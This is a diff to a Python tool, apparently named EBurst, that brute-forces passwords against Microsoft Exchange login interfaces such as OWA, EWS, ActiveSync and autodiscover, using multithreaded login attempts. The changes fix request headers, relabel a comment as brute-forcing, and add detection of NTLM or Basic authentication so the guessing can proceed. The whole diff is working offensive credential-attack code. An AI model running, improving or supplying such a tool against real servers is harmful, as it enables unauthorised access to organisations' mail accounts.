@@ -42,10 +42,9 @@ class Check_Exchange_User:
         self.msg_queue = Queue.Queue()
         self.STOP_ME = False
         threading.Thread(target=self._print_msg).start()
-
         # 导入字段用户
         self._load_dict()
-
+        # 结果存储
         outfile = domain + '.txt'
         self.outfile = open(outfile, 'w')
 
@@ -83,7 +82,7 @@ class Check_Exchange_User:
             HEADERS["Cache-Control"] = "max-age=0"
             HEADERS["Content-Type"] = "application/x-www-form-urlencoded"
             HEADERS[
-                "Referer"] = "https://" + self.domain + "//owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f" + self.domain + "%2fowa%2f"
+                "Referer"] = "https://" + self.domain + "/owa/auth/logon.aspx?replaceCurrent=1&url=https%3a%2f%2f" + self.domain + "%2fowa%2f"
             HEADERS["Cookie"] = "PrivateComputer=true; PBack=0"
 
             data = {
@@ -97,7 +96,7 @@ class Check_Exchange_User:
             }
             request = requests.session()
             request.keep_alive = False
-            response = request.post(url, data=data, headers=self.HEADERS)
+            response = request.post(url, data=data, headers=HEADERS)
             if "Location" not in response.headers:
                 return False
             if "reason" not in response.headers["Location"]:
@@ -108,7 +107,7 @@ class Check_Exchange_User:
         except:
             return False
 
-    # 验证exchange接口
+    # 爆破exchange接口
     def check_Exchange_Interfac(self, user, password):
         url, mode = self.ReqInfo["url"], self.ReqInfo["mode"]
         if mode == "NTLM":
@@ -189,6 +188,29 @@ class Check_Exchange_User:
             except:
                 print "URL: %s ,Fail"
 
+    # 检测接口认证方式开通了哪些，并替换为已开通的方式
+    def check_url_authenticate(self):
+        self.msg_queue.put('[+] Find target url authenticate method ...')
+        url = self.ReqInfo["url"]
+        mode = self.ReqInfo["mode"]
+        if mode == "http":
+            return True
+
+        request = requests.session()
+        request.keep_alive = False
+        response = request.get(url, headers=self.HEADERS)
+        authenticate_type = response.headers["WWW-Authenticate"]
+        # 认证方式不为默认类型，则替换为支持的类型
+        if mode not in authenticate_type:
+            if "NTLM" in authenticate_type:
+                self.ReqInfo["mode"] = "NTLM"
+            elif "Basic" in authenticate_type:
+                self.ReqInfo["mode"] = "Basic"
+            else:
+                return False
+        return True
+
+    #开始多线程扫描
     def _scan(self):
         self.lock.acquire()
         self.thread_count += 1
@@ -217,6 +239,11 @@ class Check_Exchange_User:
         self.msg_queue.put('status')
 
     def run(self):
+        # 验证url的认证类型
+        if not self.check_url_authenticate():
+            self.msg_queue.put('[+] Unsupport authentication method, system return')
+            return
+
         self.msg_queue.put('[+] start scan ...')
         self.start_time = time.time()
         for i in range(self.thread):
@@ -250,24 +277,24 @@ if __name__ == '__main__':
 
     group = optparse.OptionGroup(parser, "type", u"EBurst 扫描所用的接口")
     group.add_option("--autodiscover", dest="autodiscover", default=True, action='store_true',
-                     help=u"autodiscover接口，NTLM认证方式，自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。")
+                     help=u"autodiscover接口，默认NTLM认证方式，自Exchange Server 2007开始推出的一项自动服务，用于自动配置用户在Outlook中邮箱的相关设置，简化用户登陆使用邮箱的流程。")
     group.add_option("--ews", dest="ews", default=False, action='store_true',
-                     help=u"ews接口，NTLM认证方式，Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互")
+                     help=u"ews接口，默认NTLM认证方式，Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互")
     group.add_option("--mapi", dest="mapi", default=False, action='store_true',
-                     help=u"mapi接口，NTLM认证方式，Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持")
+                     help=u"mapi接口，默认NTLM认证方式，Outlook连接Exchange的默认方式，在2013和2013之后开始使用，2010 sp2同样支持")
     group.add_option("--activesync", dest="activesync", default=False, action='store_true',
-                     help=u"activesync接口，Basic认证方式，用于移动应用程序访问电子邮件")
+                     help=u"activesync接口，默认Basic认证方式，用于移动应用程序访问电子邮件")
     group.add_option("--oab", dest="oab", default=False, action='store_true',
-                     help=u"oab接口，NTLM认证方式，用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担")
+                     help=u"oab接口，默认NTLM认证方式，用于为Outlook客户端提供地址簿的副本，减轻Exchange的负担")
     group.add_option("--rpc", dest="rpc", default=False, action='store_true',
-                     help=u"rpc接口，NTLM认证方式，早期的Outlook还使用称为Outlook Anywhere的RPC交互")
-    group.add_option("--api", dest="api", default=False, action='store_true', help=u"api接口，NTLM认证方式")
+                     help=u"rpc接口，默认NTLM认证方式，早期的Outlook还使用称为Outlook Anywhere的RPC交互")
+    group.add_option("--api", dest="api", default=False, action='store_true', help=u"api接口，默认NTLM认证方式")
     group.add_option("--owa", dest="owa", default=False, action='store_true',
-                     help=u"owa接口，http认证方式，Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等")
+                     help=u"owa接口，默认http认证方式，Exchange owa 接口，用于通过web应用程序访问邮件、日历、任务和联系人等")
     group.add_option("--powershell", dest="powershell", default=False, action='store_true',
-                     help=u"powershell接口（暂不支持），Kerberos认证方式，用于服务器管理的Exchange管理控制台")
+                     help=u"powershell接口（暂不支持），默认Kerberos认证方式，用于服务器管理的Exchange管理控制台")
     group.add_option("--ecp", dest="ecp", default=False, action='store_true',
-                     help=u"ecp接口，http认证方式，Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台")
+                     help=u"ecp接口，默认http认证方式，Exchange管理中心，管理员用于管理组织中的Exchange的Web控制台")
     parser.add_option_group(group)
 
     options, _ = parser.parse_args()
